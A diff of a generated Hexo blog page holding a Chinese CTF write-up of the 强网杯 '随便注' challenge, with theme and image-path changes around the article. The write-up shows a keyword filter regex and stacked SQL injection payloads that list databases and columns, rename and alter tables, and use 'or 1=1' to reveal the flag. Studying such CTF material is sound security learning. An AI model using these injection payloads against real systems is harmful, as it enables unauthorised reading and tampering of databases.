@@ -23,12 +23,12 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="随便注[强网杯]">
     <meta name="twitter:description" content="Hexo Theme Redefine">
-    <meta name="twitter:image" content="/images/logo1.png">
+    <meta name="twitter:image" content="/images/redefine-logo.svg">
     <!--- Icon Part-->
-    <link rel="icon" type="image/png" href="/images/logo1.png" sizes="192x192">
-    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo1.png">
+    <link rel="icon" type="image/png" href="/images/redefine-logo.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-logo.svg">
     <meta name="theme-color" content="#005080">
-    <link rel="shortcut icon" href="/images/logo1.png">
+    <link rel="shortcut icon" href="/images/redefine-logo.svg">
     
     <title>
         
@@ -48,7 +48,7 @@
     <script id="hexo-configurations">
     let REDEFINE = window.REDEFINE || {};
     REDEFINE.hexo_config = {"hostname":"y4ny4n.cn","root":"/","language":"zh-CN"};
-    REDEFINE.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#005080","avatar":"/images/y4ny4n.jpg","favicon":"/images/logo1.png","og_image":{"enable":false,"image_url":null},"article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":35},"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_image":{"light":"https://s1.ax1x.com/2023/03/12/ppM1Rmj.jpg","dark":"https://s1.ax1x.com/2023/03/12/ppM171U.jpg"},"title_color":{"light":"#fff","dark":"#fff"},"description":"Let me think that there is one among those stars that guides my life through the dark unknown.","custom_font":{"enable":false,"font_family":null,"font_url":null}},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":true},"code_block":{"copy":true,"style":"mac","custom_font":{"enable":false,"font_family":null,"font_url":null}},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"1.2.0","friend_links":{"columns":2},"home_article":{"date_format":"auto","category":{"enable":true,"limit":3},"tag":{"enable":true,"limit":3}},"plugins":{"aplayer":{"enable":true,"audio":[{"name":"The Queen Of Argyll","artist":"Silly Wizard","url":"http://music.163.com/song/media/outer/url?id=19073366.mp3","cover":"/images/cover.jpg"},{"name":null,"artist":null,"url":null,"cover":null}]}}};
+    REDEFINE.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#005080","avatar":"/images/me.jpg","favicon":"/images/redefine-logo.svg","og_image":{"enable":false,"image_url":null},"article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":35},"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_image":{"light":"/images/back1.jpg","dark":"/images/back2.jpg"},"title_color":{"light":"#fff","dark":"#fff"},"description":"Let me think that there is one among those stars that guides my life through the dark unknown.","custom_font":{"enable":false,"font_family":null,"font_url":null}},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":true},"code_block":{"copy":true,"style":"mac","custom_font":{"enable":false,"font_family":null,"font_url":null}},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"1.2.0","friend_links":{"columns":2},"home_article":{"date_format":"auto","category":{"enable":true,"limit":3},"tag":{"enable":true,"limit":3}},"plugins":{"aplayer":{"enable":false,"audio":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]}}};
     REDEFINE.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
   </script>
     
@@ -116,6 +116,8 @@
                                 <a class="" 
                                     href="/"  >
                                     
+                                        
+                                            <i class="fa-regular fa-house"></i>
                                         
                                         首页
                                     
@@ -202,6 +204,8 @@
                         <a class="" 
                         href="/"  >
                              
+                                
+                                    <i class="fa-regular fa-house"></i>
                                 
                                 首页
                             
@@ -294,7 +298,7 @@
             
                 <div class="article-header">
                     <div class="avatar">
-                        <img src="/images/y4ny4n.jpg">
+                        <img src="/images/me.jpg">
                     </div>
                     <div class="info">
                         <div class="author">
@@ -346,7 +350,7 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-file-word"></i>&nbsp;<span>436 字</span>
+            <i class="fa-regular fa-file-word"></i>&nbsp;<span>438 字</span>
         </span>
     
     
@@ -368,11 +372,11 @@
 
             <div class="article-content markdown-body">
                 <p>sql注入</p>
-<a id="more"></a>
+<span id="more"></span>
 <p>学习出处：</p>
-<p><a href="https://blog.csdn.net/weixin_45551083/article/details/105389126" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45551083/article/details/105389126</a></p>
-<p><a href="https://blog.csdn.net/qq_26406447/article/details/90643951" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/90643951</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45551083/article/details/105389126">https://blog.csdn.net/weixin_45551083/article/details/105389126 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/90643951">https://blog.csdn.net/qq_26406447/article/details/90643951 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure></div>
 <p>select/update/delete/drop/insert/where过滤</p>
 <p>无法使用union联合查询，使用堆叠注入</p>
 <p>查看数据库 ?inject=1’ ;show databases—+</p>
@@ -383,19 +387,19 @@
 <p>?inject=1’ ;show columns from `1919810931114514`—+</p>
 <blockquote>
 <p>关于反引号：表名、字段、数据库名等标识符可用反引号 `  。<br>标识符也可以不使用反引号，但如果标识符包含特殊字符或保留字，则必须使用。</p>
-<p><img src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730092402760.png" alt="image-20200730092402760"></p>
+<p><img lazyload src="/images/loading.svg" data-src="随便注-强网杯/image-20200730092402760.png" alt="image-20200730092402760"></p>
 </blockquote>
 <p><strong>rename</strong></p>
 <p>rename <strong>tables</strong> tbl_name to new_tbl_name [, tbl_name2 to new_tbl_name2] …本语bai句用于对一个或多个表进行du重命名。</p>
 <p><strong>alter table</strong>s</p>
-<p><img src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730093600749.png" alt="image-20200730093600749"></p>
-<p><img src="/2020/07/30/%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20200730093702863.png" alt="image-20200730093702863"></p>
+<p><img lazyload src="/images/loading.svg" data-src="随便注-强网杯/image-20200730093600749.png" alt="image-20200730093600749"></p>
+<p><img lazyload src="/images/loading.svg" data-src="随便注-强网杯/image-20200730093702863.png" alt="image-20200730093702863"></p>
 <p>?id=1’;rename tables`words` to `aaa`;rename tables `1919810931114514` to `words`;alter table `words` add `id` int(10);alter table`words` change `flag` `data` varchar(100)—+</p>
 <p>?id=1’ or 1=1—+</p>
 <p>得到flag</p>
 <h4 id="关于是否修改flag为data"><a href="#关于是否修改flag为data" class="headerlink" title="关于是否修改flag为data"></a>关于是否修改flag为data</h4><p>看了很多wp,发现不用修改列名也能得到flag</p>
 <p>或者直接把flag改为id也可以</p>
-<p><a href="https://blog.csdn.net/qq_26406447/article/details/90643951" target="_blank" rel="noopener">https://blog.csdn.net/qq_26406447/article/details/90643951</a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/90643951">https://blog.csdn.net/qq_26406447/article/details/90643951 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>在这条中得到了答案</p>
 <p>之前猜测的内部查询语句是</p>
 <p>select id,data from words where id=</p>
@@ -734,16 +738,6 @@
     });
 </script>
 
-
-
-
-    <div id="aplayer"></div>
-
-    
-<script src="/js/libs/APlayer.min.js"></script>
-
-    
-<script src="/js/plugins/aplayer.js"></script>
 
 
 
